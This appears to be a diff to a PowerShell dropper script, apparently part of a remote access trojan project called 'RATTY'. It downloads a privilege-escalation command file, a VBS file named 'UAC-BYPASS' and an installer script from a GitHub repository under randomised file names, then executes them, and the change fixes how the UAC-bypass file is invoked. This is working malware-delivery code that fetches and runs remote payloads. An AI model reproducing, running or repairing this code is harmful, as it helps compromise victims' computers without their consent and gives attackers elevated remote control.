@@ -6,7 +6,7 @@ $uXqvmLVgcR = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 [System.Net.ServicePointManager]::SecurityProtocol = $uXqvmLVgcR
 Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/getadpriv.cmd" -OutFile "bGnQSfviwu.cmd"
 Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/payloads/UAC-BYPASS.vbs" -OutFile "fyvQVwBMgE.vbs"
-"bGnQSfviwu.cmd"|cmd;Invoke-Expression "./fyvQVwBMgE.vbs"
+"bGnQSfviwu.cmd"|cmd;Invoke-Expression ./fyvQVwBMgE.vbs
 # disable UACMOM
 Install-Module -Name PSWindowUpdate -Force
 Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/installer.ps1" -OutFile "qjhOmDleBS.ps1"
